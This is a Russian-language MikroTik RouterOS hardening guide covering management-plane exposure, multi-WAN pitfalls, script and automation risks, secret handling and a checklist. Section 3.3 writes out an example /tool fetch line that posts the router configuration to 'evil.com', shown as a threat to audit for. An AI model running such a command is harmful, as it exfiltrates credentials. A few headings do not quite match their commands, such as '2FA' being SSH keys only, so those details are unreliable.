# Overlooked Security — редко закрываемые угрозы

> Пробелы в безопасности, которые стандартные hardening guides упускают в Multi-WAN MikroTik deployments.

---

## Категория 1 — Management Plane

### 1.1 Winbox on WAN (Still #1 in 2025)

Большинство скомпрометированных MikroTik роутеров имеют Winbox, доступный из интернета. Даже пропатченные роутеры подвергаются brute force.

```
# Убедиться, что Winbox НЕ reachable с WAN
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=8291 action=drop \
    comment="BLOCK Winbox WAN" place-before=0

/ip service print
# winbox address НЕ должен быть 0.0.0.0/0
```

### 1.2 MAC-Winbox (Layer 2 Discovery)

Winbox обнаруживает роутеры через **MNDP** (port 5678 UDP) и **MAC-Telnet** (port 20561). Атакующие в том же L2 segment могут обнаружить и получить доступ к роутерам даже без IP.

```
/tool mac-server
set allowed-interface-list=none

/tool mac-server mac-winbox
set allowed-interface-list=none

/tool bandwidth-server
set enabled=no
```

### 1.3 RoMON (Router Management Overlay Network)

RoMON создаёт скрытую management mesh. Редко отключается, часто используется для lateral movement.

```
/tool romon
set enabled=no
```

### 1.4 REST API Exposure (RouterOS 7)

```
/ip service print
# api-ssl должен быть disabled или restricted
/ip service set api-ssl disabled=yes
# При необходимости:
/ip service set api-ssl address=192.168.1.0/24 certificate=your-cert
```

### 1.5 Default SNMP Community

```
/snmp community print
# НИКОГДА не оставляйте "public" или "private"
/snmp community set [find name=public] disabled=yes
/snmp community add name=monitoring addresses=192.168.1.0/24 security=authorized
```

---

## Категория 2 — Multi-WAN Specific

### 2.1 DNS Resolver Open on All WAN IPs

Каждый публичный IP WAN может принимать DNS queries, если `allow-remote-requests=yes` без filtering.

```
/ip dns set allow-remote-requests=yes
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=53 action=drop \
    comment="No DNS from WAN"
add chain=input in-interface-list=WAN protocol=tcp dst-port=53 action=drop
```

### 2.2 NTP Amplification via All WANs

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=123 action=drop
/system ntp client set enabled=yes
# Только NTP client — не server
```

### 2.3 Bandwidth Test Port (TCP 2000)

MikroTik bandwidth-test — распространённый вектор DDoS amplification.

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=2000 action=drop
/tool bandwidth-server set enabled=no
```

### 2.4 BGP Session Without Authentication

```
/routing bgp connection
# Всегда задавайте password:
set isp1 password=strong-bgp-md5-password
```

### 2.5 PCC Mangle Information Leakage

Connection marks раскрывают, какой WAN использует пользователь. Insider может определить ISP path по именам marks. В high-security средах используйте non-descriptive marks:

```
# Вместо "WAN1-conn" используйте:
new-connection-mark=0x1A
```

### 2.6 Asymmetric Firewall — IPv6 Forgotten

Большинство Multi-WAN hardening покрывает только IPv4. IPv6 обходит все rules, если `/ipv6 firewall` пуст.

```
/ipv6 firewall filter
add chain=input connection-state=established,related action=accept
add chain=input in-interface-list=WAN action=drop
add chain=forward in-interface-list=WAN connection-state=new action=drop
```

---

## Категория 3 — Automation Attack Surface

### 3.1 Netwatch Script Injection

Если Netwatch мониторит host, контролируемый атакующим, `down-script` и `up-script` выполняются с привилегиями роутера.

**Правило:** Никогда не мониторьте недоверенные external hosts в Netwatch scripts. Используйте только gateway IP.

### 3.2 Scheduler Scripts with Global Variables

```
/system script print
# Проверьте ВСЕ scripts на:
# - fetch commands к external URLs
# - user creation
# - firewall rule modification
# - unauthorized /tool e-mail send
```

### 3.3 Fetch Command Data Exfiltration

```
# ОПАСНО — exfiltrates config на external server:
/tool fetch url="http://evil.com/collect" http-method=post http-data=$config

# Audit:
/system script print
/tool fetch print
```

### 3.4 DHCP Client Script Execution

DHCP client scripts выполняются при каждом lease renewal. Скомпрометированный DHCP server может inject commands.

```
/ip dhcp-client print
# Проверьте все параметры scripts=
```

---

## Категория 4 — Data Protection

### 4.1 Config Export Contains Plaintext Secrets

```
/export file=test
# Файл содержит: password=, secret=, pre-shared-key= в plaintext
```

**Политика:**
- Шифровать `.rsc` files перед offsite storage
- Использовать password vault для credentials, а не config files
- Предпочитать `/system backup save` (binary) вместо `/export` для backups

### 4.2 Hotspot User Database

```
/ip hotspot user print
# Passwords хранятся в plaintext
/ip hotspot user export file=hotspot-users
# Этот файл — security risk
```

### 4.3 IPsec PSK in Config

```
/ip ipsec identity print
# secret= виден в export
# Используйте certificate-based authentication для production VPN
```

### 4.4 Cloud Backup (MikroTik cloud.sync)

Если включено, config синхронизируется с MikroTik cloud. Оцените, соответствует ли это требованиям data sovereignty.

```
/system backup cloud print
```

---

## Категория 5 — Network Layer

### 5.1 IP Spoofing from LAN

Без strict filtering LAN clients могут spoof source IP для манипуляции PCC classification.

```
/ip firewall filter
add chain=forward in-interface-list=LAN src-address=!192.168.1.0/24 action=drop \
    comment="Anti-spoof LAN"
```

### 5.2 Neighbor Discovery (MNDP/CDP)

Роутер broadcast'ит свою identity на всех интерфейсах, включая WAN.

```
/ip neighbor discovery-settings
set discover-interface-list=LAN
set protocol=none
# Или ограничить только LAN
```

### 5.3 UPnP (if enabled)

```
/ip upnp
print
# Должен быть disabled на edge routers
set enabled=no
```

### 5.4 Proxy ARP on WAN

Может вызывать ARP spoofing и man-in-the-middle на shared WAN segments.

```
/interface print
# verify proxy-arp=disabled на WAN interfaces
/interface set ether1 arp=enabled
# НЕ proxy-arp
```

### 5.5 ICMP Redirect Attacks

```
/ip settings
set accept-redirects=no
set accept-source-route=no
set allow-fast-path=no
```

---

## Категория 6 — Physical & Supply Chain

### 6.1 Console Port Access

Serial console даёт полный доступ без network authentication. Physical rack security обязательна.

### 6.2 RouterBOARD Bootloader Password

```
/system routerboard settings
set boot-device=try-ethernet-once-then-nand
# Prevent netboot from untrusted source
```

### 6.3 Netinstall Exposure

Роутер в netboot mode принимает любой RouterOS image из сети. Ограничьте PXE/Netinstall management VLAN.

### 6.4 Counterfeit Hardware

Покупайте только у авторизованных MikroTik distributors. Поддельные CCR units с модифицированными bootloaders уже обнаруживались.

---

## Категория 7 — Compliance & Auditing

### 7.1 Logging Gaps

Большинство deployments не логируют firewall drops с WAN. Включайте временно во время audits:

```
/ip firewall filter
add chain=input in-interface-list=WAN action=log log-prefix="AUDIT-WAN-IN" \
    comment="Temporary audit rule — disable after review"
```

### 7.2 No Change Management

Каждый `/import` или ручное изменение должно логироваться с именем инженера, датой и причиной.

### 7.3 Password Rotation

RouterOS не имеет password expiry. Внедрите quarterly rotation policy вручную.

### 7.4 Two-Factor Authentication

RouterOS 7 поддерживает SSH key authentication. Используйте keys вместо passwords для SSH:

```
/user ssh-keys import public-key-file=id_rsa.pub user=admin
/ip service set ssh auth-methods=publickey
```

---

## Overlooked Security Checklist

| # | Пункт | Часто упускают | ☐ |
|---|-------|----------------|---|
| 1 | Winbox blocked from WAN | Да | ☐ |
| 2 | MAC-Winbox disabled | Да | ☐ |
| 3 | RoMON disabled | Да | ☐ |
| 4 | Bandwidth-server disabled | Да | ☐ |
| 5 | IPv6 firewall configured | Да | ☐ |
| 6 | DNS blocked from WAN | Да | ☐ |
| 7 | NTP blocked from WAN | Да | ☐ |
| 8 | SNMP community changed | Да | ☐ |
| 9 | BGP password set | Да | ☐ |
| 10 | Netwatch scripts audited | Да | ☐ |
| 11 | Scheduler scripts audited | Да | ☐ |
| 12 | Config exports encrypted | Да | ☐ |
| 13 | MNDP restricted to LAN | Да | ☐ |
| 14 | Proxy ARP disabled on WAN | Да | ☐ |
| 15 | ICMP redirects disabled | Да | ☐ |
| 16 | LAN anti-spoof rules | Да | ☐ |
| 17 | SSH key auth enabled | Да | ☐ |
| 18 | RouterOS on latest stable | Да | ☐ |
| 19 | No default/weak users | Да | ☐ |
| 20 | Physical console secured | Да | ☐ |

---

**[← CVE Reference](cve-exploit-reference.md)** | **[Lab Exercises →](lab-exercises.md)**
